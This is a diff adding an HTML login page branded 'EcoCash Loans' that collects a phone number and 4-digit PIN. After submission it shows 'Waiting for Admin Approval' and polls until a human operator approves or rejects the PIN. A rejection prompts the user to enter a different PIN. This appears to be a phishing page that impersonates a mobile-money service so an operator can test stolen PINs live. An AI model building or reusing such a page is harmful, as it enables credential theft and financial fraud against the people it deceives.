@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>EcoCash Loans - Login</title>
+<style>
+  body { font-family: Arial, sans-serif; background: #0753a6; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; box-sizing: border-box; }
+  .card { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: center; }
+  h1 { color: #0753a6; margin-top: 0; font-size: 24px; }
+  p.subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }
+  input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+  input:focus { outline: none; border-color: #0753a6; }
+  button { width: 100%; padding: 14px; background: #0753a6; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.3s; margin-top: 15px; }
+  button:disabled { cursor: not-allowed; opacity: 0.8; }
+  #messageDiv { margin-top: 15px; font-size: 14px; min-height: 24px; font-weight: bold; }
+  .back-link { display: block; margin-top: 20px; color: #0753a6; text-decoration: none; font-size: 14px; }
+  .back-link:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+<div class="card">
+  <h1>EcoCash Loans</h1>
+  <p class="subtitle">Sign in with your registered phone number and PIN.</p>
+  <form id="loginForm">
+    <input type="text" id="phoneInput" placeholder="Zimbabwe phone number (e.g. 0771234567)" required>
+    <input type="password" id="pinInput" placeholder="4-digit PIN" maxlength="4" required>
+    <button type="submit" id="loginBtn">LOGIN</button>
+  </form>
+  <div id="messageDiv"></div>
+  <a href="/" class="back-link">Back to home</a>
+</div>
+
+<script>
+document.getElementById('loginForm').addEventListener('submit', async (e) => {
+  e.preventDefault();
+  const phone = document.getElementById('phoneInput').value;
+  const pin = document.getElementById('pinInput').value;
+  const btn = document.getElementById('loginBtn');
+  const messageDiv = document.getElementById('messageDiv');
+  
+  btn.disabled = true;
+  btn.innerText = 'Submitting...';
+  messageDiv.innerText = '';
+  messageDiv.style.color = '#0753a6';
+
+  try {
+    const response = await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phone, pin })
+    });
+    const data = await response.json();
+
+    if (!response.ok && response.status !== 202) {
+      messageDiv.style.color = 'red';
+      messageDiv.innerText = data.error || 'Login failed.';
+      resetBtn();
+      return;
+    }
+
+    if (data.authenticated) {
+      btn.innerText = 'LOGIN SUCCESSFUL';
+      btn.style.backgroundColor = '#13834b';
+      messageDiv.style.color = 'green';
+      messageDiv.innerText = 'You are logged in successfully!';
+      return;
+    }
+
+    if (data.status === 'pending_pin_approval' && data.applicationId) {
+      btn.innerText = 'Waiting for Admin Approval...';
+      btn.style.backgroundColor = '#e6a800';
+      startLivePolling(data.applicationId, btn, messageDiv);
+    }
+  } catch (err) {
+    messageDiv.style.color = 'red';
+    messageDiv.innerText = 'Network error. Please try again.';
+    resetBtn();
+  }
+
+  function resetBtn() {
+    btn.disabled = false;
+    btn.innerText = 'LOGIN';
+    btn.style.opacity = '1';
+  }
+});
+
+function startLivePolling(applicationId, btn, messageDiv) {
+  let dots = 0;
+  const loadingInterval = setInterval(() => {
+    dots = (dots + 1) % 4;
+    messageDiv.innerText = 'Checking approval status' + '.'.repeat(dots);
+  }, 500);
+
+  const pollInterval = setInterval(async () => {
+    try {
+      const res = await fetch(`/api/applications/${applicationId}/status`);
+      const statusData = await res.json();
+      if (!res.ok) return;
+
+      if (statusData.pin_status === 'approved') {
+        clearInterval(loadingInterval);
+        clearInterval(pollInterval);
+        messageDiv.style.color = 'green';
+        messageDiv.innerText = 'PIN Approved!';
+        btn.innerText = 'LOGIN SUCCESSFUL';
+        btn.style.backgroundColor = '#13834b';
+      }
+      if (statusData.pin_status === 'rejected') {
+        clearInterval(loadingInterval);
+        clearInterval(pollInterval);
+        messageDiv.style.color = 'red';
+        messageDiv.innerText = 'Your PIN was rejected by support. Please try a different PIN.';
+        btn.disabled = false;
+        btn.innerText = 'TRY AGAIN';
+        btn.style.backgroundColor = '#c83737';
+      }
+    } catch (err) {}
+  }, 3000);
+}
+</script>
+</body>
+</html>
